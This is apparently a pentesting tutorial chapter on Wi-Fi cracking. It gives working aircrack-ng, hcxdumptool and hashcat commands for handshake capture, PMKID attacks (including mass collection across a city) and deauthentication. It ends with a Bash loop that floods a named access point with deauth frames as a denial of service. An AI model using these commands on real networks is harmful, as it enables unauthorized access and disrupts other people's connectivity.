# Wireless Cracking

This chapters focuses on cracking various wireless protocols, most notably Wi-Fi. As usual, we learn by doing. So we start off a little light on the technical aspects, but those are filled in as we go. Wireless Cracking relly stands on its own as a field of Cybersecurity and is notable for lagging behind. While a good password will protect you from most harm it remains true that you can never really trust a public Access Point, which is the device we call that we connect with when we select an option from the list of available Wi-Fi providers.

## Part 0. Setting up your wireless adapter 

The first step of collecting wireless frames for a target AP is to set up your wireless adapter into Monitor mode. The steps below show how that is done for Kali Linux and Ubuntu, both used as virtual machines using VMWare.

While using Kali Linux for cracking Wi-Fi passwords is pretty good, a lot of pentesters will prefer to continue using Ubuntu, or another distro.

### Installing Aircrack-ng
```
sudo apt-get update
sudo apt-get install -y aircrack-ng
```

### Installing Hashcat

Below is the set of commands to install hashcat and its associated tools from source. Alternatively you can also install the APT packages, which is described further below.

```
sudo apt -y install libssl-dev libcurl4-openssl-dev libpcap0.8-dev zlib1g-dev

sudo git clone https://github.com/ZerBea/hcxdumptool.git
sudo git clone https://github.com/ZerBea/hcxtools.git
sudo git clone https://github.com/hashcat/hashcat.git

cd hcxdumptool
sudo make
sudo make install
cd ..
cd hcxtools/
sudo make
sudo make install
cd ..
cd hashcat
sudo make
sudo make install
cd ..
```

```
sudo apt install hcxdumptool
sudo apt install hcxtools
sudo apt install hashcat
```

### Obtain information on your wireless adapter

You have a choice of either using your builtin NIC (Network Interface Card) or one connected as an external USB device.

If you chose the latter then you can find it if the device is attached with the following command.

`$ lsusb     # list all USB connected devices`

You should see your wireless adapter, though perhaps not under the name you would think. Probably the chip manufacturer is used instead, such as Ralink.

In case your VMWare network is down use the following command

`# service NetworkManager start`

### Change wireless adapter interface (OPTIONAL)

There are more commands available that will list the properties of you wireless NIC, try some of those below to get a feel for them.

```
 $ sudo ip -a link              # reveals the MAC address of your wireless adapter, useful for if you want to change it
 $ sudo iwconfig                # set and view parameters of wireless interfaces as seen by the OS
 $ sudo iwlist channel          # provides detailed  information on the capabilities of the wireless device, in this case the frequency channels are listed
```
The command 'iwlist' will also list information regarding encryption capabilities, transmission rates and power levels. Finally, you can change the name of the wireless adapter interface, use 'ifconfig [CURRENT_INTERFACE_NAME] down' to force it.
```
 $ sudo apt install net-tools   # install ifconfig package
 $ sudo ifconfig [CURRENT_INTERFACE_NAME] down        # bring wireless NIC down
 $ sudo ip link set [CURRENT_INTERFACE_NAME] name [INTERFACE_NAME_TO_BE]`
```

### Configuring the wireless adapter for Monitor Mode

Now we can focus on finally brining the device into monitor mode. This is done with the airmon-ng suite. Install this package on you Ubuntu system if you do not already have it. On Kali airmon-ng is always preinstalled.

```
 $ sudo apt install -y aircrack-ng
```

Now bring the wireless adapter down with ifconfig

`$ sudo ifconfig [interface_name] down`

Then kill any interfering processes with the program we will be using to listen to AP

`$ sudo airmon-ng check kill` 

Then start the wireless adapter in monitor mode

`$ sudo airmon-ng start [interface_name]`

It is likely the name of the wireless NIC has been altered and the word 'mon' as been appended. Use ifconfig to bring up all the interfaces. I choose wlan0 as the name of my wireless nic, so this has been changed to wlan0mon. If config shows the following details.

```
wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-A7-63-ED-00-E7-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Now listen to Access Points and connected clients

Finally, lets listen which access points and clients are currently transmitting in your vicinity.

`$ sudo airodump-ng [interface_name]`

You should see a list of Access Points organized according to BSSID which are the 24-bit MAC addresses of those APs. 
Below the list of APs there can also be a list of connected clients organized according to AP BSSID and client station which is the MAC address of those wireless adapters.

You are now set to attempt password cracking either using the four-way handshake or the PKMID attack method.

## Part 1. Four-way handshake method

Described below is the four-way handshake method of cracking a Wi-Fi password, the name is not to be confused

### Put wireless adapter in monitor mode
```
sudo airmon-ng check kill
sudo airmon-ng start wlx00c0caa763ed
```
  
### Start capturing packets  
```  
sudo airodump-ng wlan0mon
```

Ensure our target AP, identified in the top section with BSSID has at least one device connected to it. This device is a station, identified in the second section.
Lets start capturing the four-way handshake with airodump-ng.

```
sudo airodump-ng -c [CHANNEL_INT] --bssid [BSSID_TARGET_AP] -w /path/to/cap/file
```

However, for this to work we need a station to connect to the AP. We can wait for a new device to do so, if it does we will see that at the top row in the terminal with the airodump-ng application. But we can also bump of a currently connected station and force it to reconnect. Our target will be a station found with airodump-ng.

```
aireplay -0 200 -a [BSSID_TARGET_AP] -c [MAC_TARGET_STATION] wlan0mon
``` 

### EXTRA section
While brute-force cracking of the password using Hashcat is discussed in section 3 I have added a little sneak peek, just to show it can also be done with aircrack-ng. Ensure you have a wordlist, such as rockyou, downloaded and unzipped. If you are testing the four-way handshake method on your home wireless network you can add the password to the wordlist. 

```
echo 'HOME_PASSWORD' >> rockyou.txt
tail rockyou.txt 
sudo aircrack-ng [HOME_BSSID].cap-01.cap -w rockyou.txt
```

Aircrack will go through all the password, note that this is an offline attack. There is no need for the wireless adapter to be in Monitor mode or for any other airmon-ng suite applications to be running. If you have added the password correctly then aircrack-ng will give a warning at the end. 

### Resources
 - https://www.aircrack-ng.org/doku.php?id=deauthentication
 - https://www.shellvoide.com/wifi/how-to-crack-wpa2-password-without-handshake-newly-discovered-method/

## Part 2. PKMID attack method

With this method we only to capture one EOPOL frame from the target Access Point. There is no need to capture the four-way handshake between AP and station.

Ensure that before you start you have 'hcxdumptool', 'hcxtools' and 'hashcat' installed. Then bring the wireless adapter into monitor mode as shown in section 0.
```
sudo apt install hcxdumptool
sudo apt install hcxtools
sudo apt install hashcat
```

### Collect PMKIDs

With hcxdumptool there is a mass collection command of all PMKID in the vicinity of the wireless adapter. 

`# hcxdumptool -o [name_of_your_city].pcapng -i [name_if_your_wireless_interface] --enable_status 1`

Once the tool is running you can see something as follows:
```
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0
INTERFACE HARDWARE MAC....: 00c0caa763ed
DRIVER....................: rt2800usb
DRIVER VERSION............: 5.9.0-kali5-amd64
DRIVER FIRMWARE VERSION...: 0.36
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 000dc264d261 (BROADCAST HIDDEN)
ACCESS POINT (ROGUE)......: 000dc264d262 (BROADCAST OPEN)
ACCESS POINT (ROGUE)......: 000dc264d263 (incremented on every new client)
CLIENT (ROGUE)............: dc7014c7d40d
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 63766
ANONCE....................: 40dd6b5036920e12f4a94d46c1e829858fba325487eb8fe14f34309b01553193
SNONCE....................: 63d0cfd87c0429cb52ae257f06e32ce8e27b8a6866157d850b1c7bf1052a5a40
```

To stop the capture use ctrl+c.

Now we need to convert what we have to a format suitable for cracking with hashcat. Use the following command:

`# hcxpcaptool -E essidlist -I identitylist -U usernamelist -z [name_of_your_city].16800 [name_of_your_city].pcapng`

### Second method, targeted towards a single Acess Point

Ensure your wireless adapter is placed in monitor mode, as before. Then use 'airodump-ng' to scour for possible APs to target.

```
 $ sudo airodump-ng [interface_name]
```

Save the BSSID of your target AP, such as '00:11:22:33:44:55' without colons to a text file.

```
 $ echo '001122334455' >> mac_to_crack.txt
```
Obtain the hash of the PKMID of the mac
```
 $ sudo hcxdumptool –o hash –I [interface_name] --filterlist=mac_to_crack.txt --filtermode=2 --enable_status=3
```
Then use 'hcxpcaptool' to convert pcap file to one hashcat can use
```
 $ sudo hcxpcaptool -z hashtocrack hash
```
Finally we can start cracking with hashcat
```
 $ sudo hashcat -m 16800 hashtocrack -a 3 -w 3 ‘?u?d?u?d?d65D’ --force
```

Using the same command with --show will print the password

# Part 3. Cracking password with Hashcat

```
 .\hashcat64.exe -m 16800 .\TEST3.16800 -a 0 -w 4 --force ".\rockyou.txt"
```

# Deauthentication or Denial of Service Attack

Probably the single biggest failure of the Wi-Fi or 802.11 protocol is its deauth frame. If used by a bad actor it can remove the connection between a user and an AP. The bad actor does not need access to the AP network (no password needed) not do they need special privileges. As we have see before sending the deauth frame and forcing users to re-authenticate is a necessary step in the Four-way Handshake method of cracking the network and obtaining its password. But, if we continue to send deauthentication frames to the AP we can block any user from gaining access. It is a glaring ommission only offset by stringent configuration by administrators. Yet, most don't even do that.

Lets look at an example of a deauth attack

```
# aireplay-ng  --deauth 10 -a [AP_MAC_ADDRESS] wlan0mon
```
It is a simple enough command to understand. With 'airodump-ng' we uncover the BSSID or MAC Address of the AP. With 'aireplay-ng' we use it to send deauth frames, in this case just 10.

![alt text](images/deauth_attack.jpg?raw=true)

It looks as though this attack was successful. Somebody on the network had for a few seconds no internet. Now this attack was harmless, but I could keep the 'aireplay-ng' running forever, then it would become a Denial of Service attack. But lets apply our Bash scripting skills to this problem instead.

```
#! /bin/bash

for i in {1..5000}
do
    aireplay-ng  --deauth 10 -a 00:A2:EE:FB:5B:40 wlan0mon
    sleep 60s
done
```
It is a simple script. We first declare on line 1 that this is a Bash script. We then start a for-loop that runs for 5000 iterations. It does only two things, run the aireplay-ng command with settings to create 10 deauth frames targeting the BSSID of an AP. Then sleep for 60 seconds and begin the process over again. Anyone logged into this AP would thus be hampered with intermittent network outages. Irritating, illegal, but hardly difficult to perform. 